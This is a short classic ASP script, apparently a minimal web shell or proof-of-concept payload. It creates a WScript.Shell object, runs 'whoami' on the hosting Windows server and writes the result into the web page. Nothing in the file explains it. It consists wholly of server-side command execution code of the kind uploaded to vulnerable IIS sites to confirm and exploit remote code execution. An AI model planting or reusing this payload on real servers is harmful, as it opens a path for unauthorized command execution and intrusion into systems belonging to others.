<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
